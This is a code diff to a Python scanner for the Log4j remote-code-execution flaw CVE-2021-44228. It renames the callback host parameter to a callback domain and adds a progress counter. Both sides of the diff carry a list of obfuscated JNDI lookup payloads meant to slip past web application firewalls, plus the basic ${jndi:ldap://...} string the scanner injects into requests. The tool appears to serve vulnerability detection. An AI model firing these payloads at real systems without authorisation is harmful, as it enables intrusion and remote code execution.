@@ -44,14 +44,14 @@ default_headers = {
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 timeout = 4
-waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
-                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://{{callback_host}}}",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}"]
+waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_domain}}/{{random}}}",
+                       "${${::-j}ndi:rmi://{{callback_domain}}/{{random}}}",
+                       "${jndi:rmi://{{callback_domain}}}",
+                       "${${lower:jndi}:${lower:rmi}://{{callback_domain}}/{{random}}}",
+                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_domain}}/{{random}}}",
+                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_domain}}/{{random}}}",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_domain}}/{{random}}}",
+                       "${jndi:dns://{{callback_domain}}}"]
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -98,10 +98,10 @@ parser.add_argument("--verbose",
                     dest="verbose",
                     help="Enable verbose logging.",
                     action='store_true')
-parser.add_argument("--callback-host",
-                    dest="callback_host",
-                    help="Callback host [Default: localhost:10000].",
-                    default="localhost:10000",
+parser.add_argument("--callback-domain",
+                    dest="callback_domain",
+                    help="Callback domain [Default: example.com].",
+                    default="example.com",
                     action='store')
 parser.add_argument("--dns-logs-path",
                     dest="dns_logs_path",
@@ -135,10 +135,10 @@ def get_fuzzing_post_data(payload):
     return fuzzing_post_data
 
 
-def generate_waf_bypass_payloads(callback_host, random_string):
+def generate_waf_bypass_payloads(callback_domain, random_string):
     payloads = []
     for i in waf_bypass_payloads:
-        new_payload = i.replace("{{callback_host}}", callback_host)
+        new_payload = i.replace("{{callback_domain}}", callback_domain)
         new_payload = new_payload.replace("{{random}}", random_string)
         payloads.append(new_payload)
     return payloads
@@ -177,10 +177,10 @@ def parse_url(url):
             "file_path": file_path})
 
 
-def scan_url(url, callback_host, proxies):
+def scan_url(url, callback_domain, proxies):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(16))
-    payload_callback = "%s.%s" % (random_string, callback_host)
+    payload_callback = "%s.%s" % (random_string, callback_domain)
     payload = '${jndi:ldap://%s/%s}' % (payload_callback, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
@@ -244,15 +244,15 @@ def main():
                     continue
                 urls.append(i)
 
-    callback_host = args.callback_host
+    callback_domain = args.callback_domain
 
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
-    for url in urls:
-        cprint(f"[•] URL: {url}", "magenta")
+    for idx, url in enumerate(urls):
+        cprint(f"[•] URL {idx}/{len(urls)}: {url}", "magenta")
         proxies = {}
         if args.proxy:
             proxies = {"http": args.proxy, "https": args.proxy}
-        random_string = scan_url(url, callback_host, proxies)
+        random_string = scan_url(url, callback_domain, proxies)
 
         cprint("[•] Payloads sent to all URLs. Waiting for OOB callbacks.", "cyan")
 
